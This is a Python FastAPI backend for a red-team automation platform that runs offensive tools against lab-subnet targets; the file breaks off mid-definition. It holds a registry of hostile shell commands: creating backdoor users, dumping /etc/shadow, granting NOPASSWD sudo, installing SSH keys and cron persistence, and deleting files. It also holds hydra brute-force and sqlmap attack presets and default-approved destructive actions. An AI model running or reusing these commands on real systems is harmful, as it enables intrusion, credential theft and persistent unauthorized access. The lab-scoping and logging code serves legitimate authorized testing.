#!/usr/bin/env python3
"""
Red Team Automation Platform - Fixed Version
No Stalled Jobs - Extended Timeouts & Progress Updates
"""

from __future__ import annotations

import ipaddress
import json
import os
import re
import shutil
import signal
import socket
import ssl
import subprocess
import threading
import time
import traceback
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timezone
from html import escape
from pathlib import Path
from typing import Any, Optional

from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, PlainTextResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

from backend.assets import ASSETS, asset_map, serialize_asset
from backend.catalog import MODULES, module_map, module_playbook
from backend.lab_config import load_lab_config, save_lab_config
from backend.store import JobStore
from backend.workflow import ENGAGEMENTS, FINDINGS, parse_import

# ============ Base Configuration ============
BASE_DIR = Path(__file__).resolve().parent.parent
APP_DB = BASE_DIR / "backend" / "data" / "console.db"
LAB_CONFIG = load_lab_config()
ALLOWED_SUBNET_STRINGS = tuple(LAB_CONFIG["allowed_subnets"])
LAB_PROFILES = tuple(LAB_CONFIG["lab_profiles"])
LAB_CONFIG_SOURCE = str(LAB_CONFIG["source"])
LAB_CONFIG_PATH = str(LAB_CONFIG["path"])
ALLOWED_SUBNETS = tuple(ipaddress.ip_network(cidr) for cidr in ALLOWED_SUBNET_STRINGS)

# ============ Fixed: Longer Timeouts ============
EXECUTION_MODE = "live-execution"
DESTRUCTIVE_MODE = "enabled"
JOB_HEARTBEAT_TIMEOUT_SECONDS = 600  # 10 MENIT
COMMAND_TIMEOUT_SECONDS = 900  # 15 MENIT

# ============ Core Imports & Init ============
JOB_STORE = JobStore(APP_DB)
MODULE_BY_ID = module_map()
ASSET_BY_IP = asset_map()
SEVERITY_ORDER = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
ACTIVE_PROCESSES: dict[str, subprocess.Popen[str]] = {}
STOP_REQUESTS: set[str] = set()
PROCESS_LOCK = threading.Lock()

app = FastAPI(title="Red Team Automation Platform - Fixed")
app.mount("/static", StaticFiles(directory=BASE_DIR), name="static")

# ============ Data Models ============
class JobRequest(BaseModel):
    target: str = Field(..., examples=["10.10.10.20"])
    note: str = Field(default="", max_length=160)

class ModuleJobRequest(JobRequest):
    module_id: str
    execution_profile: str = Field(default="balanced")

class ImportRequest(BaseModel):
    tool_name: str = Field(default="generic")
    target: str = Field(..., examples=["10.10.10.20"])
    content: str = Field(default="")

class ConfigUpdateRequest(BaseModel):
    allowed_subnets: list[str] = Field(default_factory=list)

class DestructiveActionRequest(BaseModel):
    action: str
    target: str
    approved: bool = True
    approved_by: str = "system"

class ExploitRequest(BaseModel):
    target: str
    exploit_type: str
    params: dict[str, Any] = Field(default_factory=dict)

# ============ Extended Tool Definitions ============
TOOL_COMMAND_ALIASES: dict[str, list[str] | None] = {
    "nmap": ["nmap"],
    "masscan": ["masscan"],
    "rustscan": ["rustscan"],
    "subfinder": ["subfinder"],
    "shuffledns": ["shuffledns"],
    "chaos": ["chaos"],
    "waybackurls": ["waybackurls"],
    "gau": ["gau", "getallurls"],
    "fierce": ["fierce"],
    "dnsrecon": ["dnsrecon"],
    "dnsx": ["dnsx"],
    "amass": ["amass"],
    "httpx": ["httpx"],
    "whatweb": ["whatweb"],
    "wappalyzer": ["wappalyzer"],
    "nuclei": ["nuclei"],
    "katana": ["katana"],
    "dalfox": ["dalfox"],
    "xsstrike": ["xsstrike"],
    "ffuf": ["ffuf"],
    "gobuster": ["gobuster"],
    "curl": ["curl"],
    "sqlmap": ["sqlmap"],
    "nikto": ["nikto"],
    "wpscan": ["wpscan"],
    "jwt-tool": ["jwt-tool", "jwt"],
    "burpsuite": ["burpsuite"],
    "hydra": ["hydra"],
    "medusa": ["medusa"],
    "crowbar": ["crowbar"],
    "kerbrute": ["kerbrute"],
    "hashcat": ["hashcat"],
    "john": ["john"],
    "ncrack": ["ncrack"],
    "patator": ["patator"],
    "metasploit": ["msfconsole", "msfvenom"],
    "searchsploit": ["searchsploit"],
    "commix": ["commix"],
    "beef": ["beef-xss"],
    "bettercap": ["bettercap"],
    "responder": ["responder"],
    "mitm6": ["mitm6"],
    "bloodhound": ["bloodhound"],
    "bloodhound-python": ["bloodhound-python"],
    "enum4linux-ng": ["enum4linux-ng"],
    "impacket": ["impacket"],
    "mimikatz": ["mimikatz"],
    "proxychains": ["proxychains4", "proxychains"],
    "chisel": ["chisel"],
    "ssh": ["ssh"],
    "openssl": ["openssl"],
    "sslyze": ["sslyze"],
    "dig": ["dig"],
    "rpcclient": ["rpcclient"],
    "smbclient": ["smbclient"],
    "ldapsearch": ["ldapsearch"],
    "autoruns": ["autoruns"],
    "schtasks": ["schtasks"],
    "crontab": ["crontab"],
    "systemctl": ["systemctl"],
    "sc": ["sc"],
    "reg": ["reg"],
    "tcpdump": ["tcpdump"],
    "wireshark": ["wireshark"],
    "zeek": ["zeek"],
    "suricata": ["suricata"],
    "ncat": ["ncat"],
    "socat": ["socat"],
    "ngrok": ["ngrok"],
    "jq": ["jq"],
    "pandoc": ["pandoc"],
    "graphviz": ["dot"],
    "yara": ["yara"],
    "strings": ["strings"],
    "file": ["file"],
    "sha256sum": ["sha256sum"],
    "swaks": ["swaks"],
    "mailparser": ["mailparser", "eml-parser"],
    "urlscan": ["urlscan"],
    "mitmproxy": ["mitmproxy"],
    "sigma": None,
    "sysmon": None,
    "markdown": None,
    "otp-review": None,
    "killchain": None,
}

UNMODELED_WSL_TOOLS: tuple[dict[str, str], ...] = (
    {"label": "amass", "command": "amass", "phase_id": "recon", "phase_label": "Reconnaissance", "rationale": "asset and subdomain expansion for lab scoping"},
    {"label": "nikto", "command": "nikto", "phase_id": "baseline", "phase_label": "Baseline Assessment", "rationale": "web misconfiguration and known exposure review"},
    {"label": "gobuster", "command": "gobuster", "phase_id": "baseline", "phase_label": "Baseline Assessment", "rationale": "content and route discovery on approved targets"},
    {"label": "hashcat", "command": "hashcat", "phase_id": "objective", "phase_label": "Actions on Objectives", "rationale": "offline credential exposure impact simulation"},
    {"label": "john", "command": "john", "phase_id": "objective", "phase_label": "Actions on Objectives", "rationale": "offline password review for credential impact workflows"},
)

# ============ Destructive Action Registry ============
DESTRUCTIVE_ACTIONS = {
    "service_stop": {"description": "Stop critical services", "severity": "critical", "command": "systemctl stop {service}", "recovery": "systemctl start {service}"},
    "service_start": {"description": "Start services", "severity": "medium", "command": "systemctl start {service}", "recovery": "systemctl stop {service}"},
    "file_delete": {"description": "Delete files (DESTRUCTIVE!)", "severity": "critical", "command": "rm -f {file}", "recovery": "Restore from backup"},
    "user_create": {"description": "Create backdoor user", "severity": "high", "command": "useradd -m -s /bin/bash {username} && echo '{username}:{password}' | chpasswd", "recovery": "userdel -r {username}"},
    "user_delete": {"description": "Delete user (DESTRUCTIVE!)", "severity": "critical", "command": "userdel -rf {username}", "recovery": "Recreate user"},
    "firewall_bypass": {"description": "Add firewall rule", "severity": "high", "command": "iptables -I INPUT -s {source} -j ACCEPT", "recovery": "iptables -D INPUT -s {source} -j ACCEPT"},
    "cron_persistence": {"description": "Install cron persistence", "severity": "high", "command": "echo '{schedule} {command}' >> /etc/crontab", "recovery": "Remove cron entry"},
    "file_upload": {"description": "Upload backdoor", "severity": "high", "command": "scp -o StrictHostKeyChecking=no {local} {user}@{target}:{remote}", "recovery": "Delete file"},
    "file_download": {"description": "Download sensitive file", "severity": "high", "command": "scp -o StrictHostKeyChecking=no {user}@{target}:{remote} {local}", "recovery": "Delete file"},
    "process_kill": {"description": "Kill process", "severity": "critical", "command": "kill -9 {pid}", "recovery": "Restart process"},
    "credentials_dump": {"description": "Dump credentials", "severity": "critical", "command": "cat /etc/shadow", "recovery": "Reset all compromised credentials"},
    "persistence_install": {"description": "Install persistence", "severity": "high", "command": "cp {file} /etc/init.d/ && update-rc.d {file} defaults", "recovery": "update-rc.d -f {file} remove"},
    "ssh_key_install": {"description": "Install SSH backdoor", "severity": "high", "command": "mkdir -p .ssh && echo '{ssh_key}' >> .ssh/authorized_keys", "recovery": "Remove SSH key"},
    "password_change": {"description": "Change password", "severity": "high", "command": "echo '{username}:{new_password}' | chpasswd", "recovery": "Reset password"},
    "sudo_install": {"description": "Grant sudo privileges", "severity": "critical", "command": "echo '{username} ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "recovery": "Remove from /etc/sudoers"},
}

# ============ Utility Functions ============
def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()

def parse_iso_timestamp(value: str | None) -> datetime | None:
    if not value:
        return None
    try:
        return datetime.fromisoformat(value)
    except ValueError:
        return None

def validate_target(target: str) -> str:
    try:
        address = ipaddress.ip_address(target)
    except ValueError as error:
        raise HTTPException(status_code=400, detail="Target harus berupa IPv4/IPv6 yang valid.") from error

    if not any(address in subnet for subnet in ALLOWED_SUBNETS):
        allowed_text = ", ".join(str(subnet) for subnet in ALLOWED_SUBNETS)
        raise HTTPException(
            status_code=400,
            detail=f"Target di luar subnet lab yang diizinkan. Gunakan alamat dalam: {allowed_text}.",
        )
    return str(address)

def tool_status(label: str) -> dict[str, Any]:
    commands = TOOL_COMMAND_ALIASES.get(label, [label])
    if commands is None:
        return {"label": label, "kind": "conceptual", "installed": None, "command": None}
    for command in commands:
        if shutil.which(command):
            return {"label": label, "kind": "binary", "installed": True, "command": command}
    return {"label": label, "kind": "binary", "installed": False, "command": commands[0]}

def check_tool_availability(tool_name: str) -> bool:
    status = tool_status(tool_name)
    return status.get("installed", False) is True

def first_existing_path(candidates: list[str], fallback: str) -> str:
    for candidate in candidates:
        if Path(candidate).exists():
            return candidate
    return fallback

def preferred_small_web_wordlist() -> str:
    return first_existing_path(
        [
            "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
            "/usr/share/seclists/Discovery/Web-Content/common.txt",
            "/usr/share/wordlists/seclists/Discovery/Web_Content/common.txt",
            "/usr/share/wordlists/dirb/common.txt",
        ],
        "/usr/share/wordlists/dirb/common.txt",
    )

def preferred_small_password_wordlist() -> str:
    return first_existing_path(
        [
            "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
            "/usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt",
            "/usr/share/wordlists/fasttrack.txt",
            "/usr/share/wordlists/rockyou.txt",
        ],
        "/usr/share/wordlists/rockyou.txt",
    )

def preferred_small_user_wordlist() -> str:
    return first_existing_path(
        [
            "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
            "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
            "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt",
            "users.txt",
        ],
        "users.txt",
    )

def normalize_execution_profile(value: str | None, *, force_fast: bool = False) -> str:
    if force_fast:
        return "fast"
    profile = str(value or "balanced").strip().lower()
    if profile not in {"fast", "balanced", "deep"}:
        return "balanced"
    return profile

def register_active_process(job_id: str, process: subprocess.Popen[str]) -> None:
    if not job_id or job_id in {"temp", "destructive"}:
        return
    with PROCESS_LOCK:
        ACTIVE_PROCESSES[job_id] = process

def unregister_active_process(job_id: str, process: subprocess.Popen[str] | None = None) -> None:
    if not job_id or job_id in {"temp", "destructive"}:
        return
    with PROCESS_LOCK:
        current = ACTIVE_PROCESSES.get(job_id)
        if current is None:
            return
        if process is not None and current is not process:
            return
        ACTIVE_PROCESSES.pop(job_id, None)

def request_stop(job_id: str) -> None:
    with PROCESS_LOCK:
        STOP_REQUESTS.add(job_id)

def clear_stop_request(job_id: str) -> None:
    with PROCESS_LOCK:
        STOP_REQUESTS.discard(job_id)

def is_stop_requested(job_id: str) -> bool:
    with PROCESS_LOCK:
        return job_id in STOP_REQUESTS

def has_active_process(job_id: str) -> bool:
    with PROCESS_LOCK:
        process = ACTIVE_PROCESSES.get(job_id)
    return process is not None and process.poll() is None

def target_tcp_reachable(target: str, ports: tuple[int, ...] = (80, 443, 22, 8080, 8443), timeout: float = 1.2) -> bool:
    for port in ports:
        try:
            with socket.create_connection((target, port), timeout=timeout):
                return True
        except OSError:
            continue
    return False

def target_ping_reachable(target: str, timeout_seconds: int = 1) -> bool:
    if shutil.which("ping") is None:
        return False
    command = f"ping -c 1 -W {timeout_seconds} {target}" if os.name == "posix" else f"ping -n 1 -w {timeout_seconds * 1000} {target}"
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=max(3, timeout_seconds + 2))
        return result.returncode == 0
    except Exception:
        return False

def target_preflight_reachable(target: str) -> bool:
    return target_tcp_reachable(target) or target_ping_reachable(target)

def stop_process_tree(process: subprocess.Popen[str]) -> None:
    if process.poll() is not None:
        return
    try:
        if os.name == "posix":
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            time.sleep(0.5)
            if process.poll() is None:
                os.killpg(os.getpgid(process.pid), signal.SIGKILL)
        else:
            process.terminate()
            time.sleep(0.5)
            if process.poll() is None:
                process.kill()
    except Exception:
        try:
            process.kill()
        except Exception:
            pass

def request_stop_job(job_id: str, reason: str = "Stop requested by operator.") -> dict[str, Any] | None:
    job = JOB_STORE.get_job(job_id)
    if not job:
        return None
    if str(job.get("status")) in {"completed", "failed", "stopped"}:
        return job

    request_stop(job_id)
    safe_append_log(job_id, f"🛑 {reason}", "warning")
    JOB_STORE.update_job(job_id, status="stopping", updated_at=now_iso())

    with PROCESS_LOCK:
        process = ACTIVE_PROCESSES.get(job_id)
    if process is not None:
        stop_process_tree(process)

    return JOB_STORE.get_job(job_id)

def mark_job_stopped(job_id: str, reason: str = "Job stopped by operator.") -> None:
    job = JOB_STORE.get_job(job_id)
    if not job:
        return
    logs = [*job["logs"], make_log(reason, severity="warning")]
    updated_runs: list[dict[str, Any]] = []
    for run in job["module_runs"]:
        status = str(run.get("status") or "queued")
        if status in {"queued", "running"}:
            updated_runs.append({**run, "status": "stopped", "completed_at": now_iso()})
        else:
            updated_runs.append(run)
    JOB_STORE.update_job(job_id, status="stopped", logs=logs, module_runs=updated_runs, updated_at=now_iso())

def mark_job_failed_preflight(job_id: str, reason: str) -> None:
    job = JOB_STORE.get_job(job_id)
    if not job:
        return
    logs = [*job["logs"], make_log(reason, severity="critical")]
    updated_runs: list[dict[str, Any]] = []
    for run in job["module_runs"]:
        status = str(run.get("status") or "queued")
        next_status = "stopped" if status == "queued" else "failed"
        updated_runs.append({**run, "status": next_status, "completed_at": now_iso()})
    JOB_STORE.update_job(job_id, status="failed", progress=100, logs=logs, module_runs=updated_runs, updated_at=now_iso())

def reconcile_job_state(job: dict[str, Any] | None) -> dict[str, Any] | None:
    if not job:
        return None

    status = str(job.get("status") or "")
    job_id = str(job.get("id"))
    updated_at = parse_iso_timestamp(str(job.get("updated_at") or "")) or parse_iso_timestamp(str(job.get("created_at") or ""))
    age_seconds = (datetime.now(timezone.utc) - updated_at).total_seconds() if updated_at else 0

    if status in {"running", "pending"} and not has_active_process(job_id) and age_seconds > JOB_HEARTBEAT_TIMEOUT_SECONDS:
        logs = [*job["logs"], make_log("Job marked failed after stale heartbeat timeout.", severity="critical")]
        updated_runs: list[dict[str, Any]] = []
        for run in job["module_runs"]:
            run_status = str(run.get("status") or "queued")
            if run_status == "running":
                updated_runs.append({**run, "status": "failed", "completed_at": now_iso(), "highest_severity": "critical"})
            elif run_status == "queued":
                updated_runs.append({**run, "status": "stopped", "completed_at": now_iso()})
            else:
                updated_runs.append(run)
        JOB_STORE.update_job(job_id, status="failed", logs=logs, module_runs=updated_runs, updated_at=now_iso())
        return JOB_STORE.get_job(job_id)

    if status != "stopping":
        return job

    if has_active_process(job_id):
        return job

    updated_at = parse_iso_timestamp(str(job.get("updated_at") or ""))
    now = datetime.now(timezone.utc)
    if updated_at is not None and (now - updated_at).total_seconds() < 2:
        return job

    mark_job_stopped(job_id, "Job auto-finalized after stop request.")
    return JOB_STORE.get_job(job_id)

# ============ FIXED: Safe Progress Update ============
def safe_update_progress(job_id: str, value: int) -> None:
    """Update progress with safety check - prevents NoneType error"""
    try:
        job = JOB_STORE.get_job(job_id)
        if job is None:
            # Job not found - log but don't crash
            print(f"⚠️ Warning: Job {job_id} not found for progress update")
            return
        JOB_STORE.update_job(job_id, progress=max(0, min(100, value)), updated_at=now_iso())
    except Exception as e:
        # Silently handle any error - don't crash the job
        print(f"⚠️ Progress update error: {e}")

def safe_append_log(job_id: str, message: str, severity: str = "info") -> None:
    """Append log with safety check"""
    try:
        job = JOB_STORE.get_job(job_id)
        if job is None:
            print(f"⚠️ Job {job_id} not found for log: {message}")
            return
        logs = [*job["logs"], {"timestamp": now_iso(), "severity": severity, "message": message}]
        JOB_STORE.update_job(job_id, logs=logs, updated_at=now_iso())
    except Exception as e:
        print(f"⚠️ Log error: {e}")

def infer_tool_name(command: str) -> str:
    cmd = command.strip()
    if cmd.startswith("$ "):
        cmd = cmd[2:]
    base = cmd.split()[0] if cmd.split() else "command"
    return base

def format_elapsed_short(seconds: float) -> str:
    total = max(0, int(seconds))
    minutes, secs = divmod(total, 60)
    hours, minutes = divmod(minutes, 60)
    if hours:
        return f"{hours}h {minutes}m"
    if minutes:
        return f"{minutes}m {secs}s"
    return f"{secs}s"

def heartbeat_interval_for_tool(tool_name: str, elapsed: float) -> int:
    slow_tools = {"nmap", "nuclei", "nikto", "gobuster", "hydra", "sqlmap", "ffuf", "dirsearch"}
    if tool_name in slow_tools:
        if elapsed < 30:
            return 5
        if elapsed < 120:
            return 10
        return 20
    if elapsed < 20:
        return 5
    if elapsed < 60:
        return 8
    return 15

def progress_heartbeat_value(current_progress: int, elapsed: float, timeout: int) -> int:
    timeout = max(timeout, 1)
    projected = 50 + int((elapsed / timeout) * 25)
    return min(85, max(current_progress, projected))

# ============ FIXED: execute_command_with_progress ============
def execute_command_with_progress(command: str, job_id: str, target: str = "", timeout: int = COMMAND_TIMEOUT_SECONDS, capture_output: bool = True) -> dict[str, Any]:
    """Execute command with progress updates - FIXED NoneType error"""
    safe_target = str(target).strip()
    
    # Replace placeholders
    cmd = command
    if safe_target:
        cmd = (cmd.replace("TARGET", safe_target)
               .replace("lab.local", safe_target)
               .replace("target:443", f"{safe_target}:443")
               .replace("ssh://target", f"ssh://{safe_target}"))
    
    if cmd.startswith("$ "):
        cmd = cmd[2:]
    
    # Whitelist check
    cmd_parts = cmd.split()
    if cmd_parts:
        base_cmd = cmd_parts[0]
        allowed = False
        for aliases in TOOL_COMMAND_ALIASES.values():
            if aliases and base_cmd in aliases:
                allowed = True
                break
        if not allowed and base_cmd not in ["echo", "cat", "grep", "awk", "sed", "head", "tail", "ls", "pwd", "whoami", "scp", "ssh"]:
            return {"success": False, "stdout": "", "stderr": f"Command '{base_cmd}' not allowed", "returncode": -1, "command": cmd}
    
    tool_name = infer_tool_name(cmd)
    
    # FIXED: Safe progress update
    try:
        job = JOB_STORE.get_job(job_id)
        if job:
            current_progress = job.get("progress", 0)
            safe_update_progress(job_id, min(50, current_progress + 5))
        safe_append_log(job_id, f"⏳ Executing {tool_name}: {cmd[:120]}", "info")
    except Exception as e:
        # Don't let logging/progress errors crash the command
        print(f"⚠️ Progress/log error (non-critical): {e}")
    
    try:
        process = subprocess.Popen(
            cmd,
            shell=True,
            start_new_session=(os.name == "posix"),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            env={"PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "HOME": str(Path.home())}
        )
        register_active_process(job_id, process)
        
        # Monitor progress while command runs
        start_time = time.time()
        last_heartbeat = 0.0
        
        while process.poll() is None:
            elapsed = time.time() - start_time
            if is_stop_requested(job_id):
                stop_process_tree(process)
                safe_append_log(job_id, f"🛑 {tool_name} stopped after {format_elapsed_short(elapsed)}", "warning")
                return {"success": False, "stdout": "", "stderr": "Command stopped by operator", "returncode": -2, "command": cmd, "cancelled": True}
            if elapsed >= timeout:
                stop_process_tree(process)
                safe_append_log(job_id, f"Command timeout for {tool_name} after {format_elapsed_short(elapsed)}", "warning")
                return {"success": False, "stdout": "", "stderr": f"Command timed out after {timeout} seconds", "returncode": -1, "command": cmd}
            heartbeat_interval = heartbeat_interval_for_tool(tool_name, elapsed)
            if elapsed - last_heartbeat >= heartbeat_interval:
                last_heartbeat = elapsed
                try:
                    safe_append_log(
                        job_id,
                        f"⏳ {tool_name} still running... {format_elapsed_short(elapsed)} elapsed",
                        "info",
                    )
                    job = JOB_STORE.get_job(job_id)
                    if job:
                        current_progress = job.get("progress", 0)
                        next_progress = progress_heartbeat_value(current_progress, elapsed, timeout)
                        if next_progress > current_progress:
                            safe_update_progress(job_id, next_progress)
                except Exception:
                    pass
            time.sleep(1)
        
        # Get output
        stdout, stderr = process.communicate(timeout=timeout)
        
        stdout = stdout if stdout else ""
        stderr = stderr if stderr else ""
        
        # Limit output
        max_output = 1024 * 1024
        if len(stdout) > max_output:
            stdout = stdout[:max_output] + "\n... [output truncated]"
        if len(stderr) > max_output:
            stderr = stderr[:max_output] + "\n... [output truncated]"
        
        return {"success": process.returncode == 0, "stdout": stdout, "stderr": stderr, "returncode": process.returncode, "command": cmd}
    except subprocess.TimeoutExpired:
        process.kill()
        return {"success": False, "stdout": stdout if stdout else "", "stderr": f"Command timed out after {timeout} seconds", "returncode": -1, "command": cmd}
    except Exception as e:
        return {"success": False, "stdout": "", "stderr": str(e), "returncode": -1, "command": cmd}
    finally:
        unregister_active_process(job_id, process if "process" in locals() else None)

# ============ Core Functions ============
def module_execution_profile(module_id: str, execution_profile: str = "balanced") -> str:
    profile = normalize_execution_profile(execution_profile)
    return profile

def module_command_preview(module_id: str, target: str = "TARGET", execution_profile: str = "balanced") -> list[str]:
    web_wordlist = preferred_small_web_wordlist()
    password_wordlist = preferred_small_password_wordlist()
    user_wordlist = preferred_small_user_wordlist()
    profile = normalize_execution_profile(execution_profile)
    command_map: dict[str, dict[str, list[str]]] = {
        "recon-service-scan": {
            "fast": [
                f"nmap -Pn -n -sS -sV --version-light -T4 --top-ports 1000 --min-rate 1500 --max-retries 2 --open {target}",
                f"nmap -Pn -n --script http-title,http-headers,ssl-cert -p <web-ports> {target}",
            ],
            "balanced": [
                f"nmap -Pn -n -sS -sV --version-light -T4 --top-ports 1000 --min-rate 1500 --max-retries 2 --defeat-rst-ratelimit --open {target}",
                f"nmap -Pn -n -sC -sV --version-light --script-timeout 20s --max-retries 2 -T4 -p <open-ports> {target}",
                f"nmap -Pn -n --script http-title,http-headers,ssl-cert -p <web-ports> {target}",
            ],
            "deep": [
                f"nmap -Pn -n -sS -sV --version-all -T4 --top-ports 1500 --min-rate 1800 --max-retries 3 --open {target}",
                f"nmap -Pn -n -sC -sV --version-all --script-timeout 30s --max-retries 3 -T4 -p <open-ports> {target}",
                f"nmap -Pn -n --script http-title,http-headers,ssl-cert,vulners -p <web-ports> {target}",
            ],
        },
        "recon-host-discovery": {
            "fast": [f"nmap -sn -n {target}"],
            "balanced": [f"nmap -sn -n {target}", f"httpx -silent -status-code -title http://{target}"],
            "deep": [f"nmap -sn -n {target}", f"nmap -Pn -n -PS22,80,443 -PA80,443 {target}", f"httpx -silent -status-code -title http://{target}"],
        },
        "recon-dns-enumeration": {
            "fast": [f"dnsx -silent -resp -a -ptr {target}"],
            "balanced": [f"dnsx -silent -resp -a -ptr {target}", f"httpx -silent -probe -title http://{target}"],
            "deep": [f"dnsx -silent -resp -a -aaaa -cname -ptr {target}", f"httpx -silent -probe -title -tech-detect http://{target}"],
        },
        "recon-amass-expansion": {
            "fast": ["amass enum -passive -d TARGET"],
            "balanced": ["amass enum -passive -d TARGET", "amass enum -d TARGET -o evidence/amass-active.txt"],
            "deep": ["amass enum -passive -d TARGET", "amass enum -brute -src -d TARGET -o evidence/amass-deep.txt"],
        },
        "baseline-web-fingerprint": {
            "fast": [f"httpx -u http://{target} -status-code -title -silent"],
            "balanced": [f"httpx -u http://{target} -status-code -title -tech-detect -tls-probe -silent", f"whatweb -a 3 http://{target} -v --no-errors"],
            "deep": [f"httpx -u http://{target} -status-code -title -tech-detect -tls-probe -web-server -server -silent", f"whatweb -a 3 http://{target} -v --no-errors"],
        },
        "baseline-content-discovery": {
            "fast": [f"ffuf -u http://{target}/FUZZ -w {web_wordlist} -mc 200,301,302,403 -fc 404 -t 20", f"httpx -silent -path /admin,/login,/api -status-code -title http://{target}"],
            "balanced": [f"ffuf -u http://{target}/FUZZ -w {web_wordlist} -mc 200,301,302,403 -fc 404 -t 30", f"httpx -silent -path /admin,/login,/api,/backup -status-code -title http://{target}"],
            "deep": [f"ffuf -u http://{target}/FUZZ -w {web_wordlist} -mc 200,204,301,302,307,401,403 -fc 404 -t 40", f"httpx -silent -path /admin,/login,/api,/backup,/uploads,/debug -status-code -title http://{target}"],
        },
        "baseline-nikto-review": {
            "fast": [f"nikto -h http://{target} -nointeractive -Tuning b"],
            "balanced": [f"nikto -h http://{target} -nointeractive", f"nuclei -u http://{target} -tags misconfig,exposure,default-login"],
            "deep": [f"nikto -h http://{target} -nointeractive -Tuning 123b", f"nuclei -u http://{target} -tags misconfig,exposure,default-login,files"],
        },
        "baseline-gobuster-routes": {
            "fast": [f"gobuster dir -u http://{target} -w {web_wordlist} -k -q -t 20"],
            "balanced": [f"gobuster dir -u http://{target} -w {web_wordlist} -k -q", f"httpx -silent -path /admin,/backup,/uploads,/api-docs -status-code -title http://{target}"],
            "deep": [f"gobuster dir -u http://{target} -w {web_wordlist} -k -q -x php,txt,bak,zip -t 30", f"httpx -silent -path /admin,/backup,/uploads,/api-docs,/old,/internal -status-code -title http://{target}"],
        },
        "baseline-tls-dns-review": {
            "fast": [f"httpx -u https://{target} -tls-probe -status-code -silent"],
            "balanced": [f"httpx -u https://{target} -tls-probe -tech-detect -status-code -silent", f"openssl s_client -connect {target}:443 -servername {target}"],
            "deep": [f"httpx -u https://{target} -tls-probe -tech-detect -status-code -silent", f"sslyze --regular {target}:443"],
        },
        "weapon-artifact-review": {
            "fast": ["sha256sum sample.bin"],
            "balanced": ["sha256sum sample.bin", "file sample.bin && strings -n 8 sample.bin | head"],
            "deep": ["sha256sum sample.bin", "file sample.bin && strings -n 6 sample.bin | head -n 60"],
        },
        "weapon-dropper-safety": {
            "fast": ["sha256sum approved-artifact.bin"],
            "balanced": ["sha256sum approved-artifact.bin", "yara rules/lab-artifact-policy.yar approved-artifact.bin"],
            "deep": ["sha256sum approved-artifact.bin", "yara rules/lab-artifact-policy.yar approved-artifact.bin", "strings -n 6 approved-artifact.bin | head -n 60"],
        },
        "weapon-defender-view": {
            "fast": ["file sample.bin"],
            "balanced": ["strings -n 6 sample.bin | head -n 40", "file sample.bin && sha256sum sample.bin"],
            "deep": ["strings -n 6 sample.bin | head -n 80", "file sample.bin && sha256sum sample.bin"],
        },
        "delivery-email-tabletop": {
            "fast": ["swaks --server mail.lab.local --to user@lab.local --quit-after RCPT"],
            "balanced": ["swaks --server mail.lab.local --to user@lab.local --from redteam@lab.local --quit-after RCPT", "eml-parser tabletop-message.eml"],
            "deep": ["swaks --server mail.lab.local --to user@lab.local --from redteam@lab.local --quit-after DATA", "eml-parser tabletop-message.eml"],
        },
        "delivery-web-hosting-review": {
            "fast": [f"httpx -u http://{target} -status-code -title -silent"],
            "balanced": [f"httpx -u http://{target} -status-code -title -tech-detect -silent", f"curl -skI http://{target}"],
            "deep": [f"httpx -u http://{target} -status-code -title -tech-detect -web-server -silent", f"curl -skI http://{target}"],
        },
        "delivery-responder-awareness": {
            "fast": ["responder -I eth0 -A"],
            "balanced": ["responder -I eth0 -A", "tcpdump -ni eth0 port 5355 or port 137"],
            "deep": ["responder -I eth0 -A", "tcpdump -ni eth0 port 5355 or port 137 or port 138"],
        },
        "exploit-sql-validation": {
            "fast": [f"sqlmap -u http://{target}/item?id=1 --batch --risk 1 --level 1"],
            "balanced": [f"sqlmap -u http://{target}/item?id=1 --batch --risk 2 --level 2", f"nuclei -u http://{target} -tags sqli"],
            "deep": [f"sqlmap -u http://{target}/item?id=1 --batch --risk 3 --level 3 --threads 4", f"nuclei -u http://{target} -tags sqli,misconfig"],
        },
        "exploit-auth-control-review": {
            "fast": [f"hydra -L {user_wordlist} -P {password_wordlist} ssh://{target} -t 2 -f"],
            "balanced": [f"hydra -L {user_wordlist} -P {password_wordlist} ssh://{target} -t 4 -f", f"httpx -u http://{target} -path /login,/admin -status-code -title -silent"],
            "deep": [f"hydra -L {user_wordlist} -P {password_wordlist} ssh://{target} -t 6 -f -W 3", f"httpx -u http://{target} -path /login,/admin,/auth,/portal -status-code -title -silent"],
        },
        "exploit-session-review": {
            "fast": [f"curl -skI http://{target}"],
            "balanced": [f"jwt-tool -t http://{target} -M at", f"curl -skI http://{target}"],
            "deep": [f"jwt-tool -t http://{target} -M at -S hs256", f"curl -skI http://{target}"],
        },
        "install-persistence-checklist": {
            "fast": [f"find /etc/cron* -maxdepth 2 -type f 2>/dev/null | head -n 20"],
            "balanced": [f"ssh {target} 'crontab -l; systemctl list-unit-files --type=service | head'", f"find /etc/cron* -maxdepth 2 -type f 2>/dev/null | head -n 40"],
            "deep": [f"ssh {target} 'crontab -l; systemctl list-unit-files --type=service | head -n 40'", "find /etc/systemd /etc/cron* -type f 2>/dev/null | head -n 80"],
        },
        "install-registry-cron-audit": {
            "fast": ["crontab -l"],
            "balanced": ["crontab -l", "systemctl list-timers --all"],
            "deep": ["crontab -l", "systemctl list-timers --all", "find /etc/cron* -type f 2>/dev/null"],
        },
        "install-defender-recovery": {
            "fast": ["autoruns --help"],
            "balanced": ["autoruns --help", "schtasks /query /fo LIST /v"],
            "deep": ["autoruns --help", "schtasks /query /fo LIST /v", "systemctl list-unit-files --type=service"],
        },
        "c2-telemetry-review": {
            "fast": ["tcpdump -ni eth0 port 8000 or port 443"],
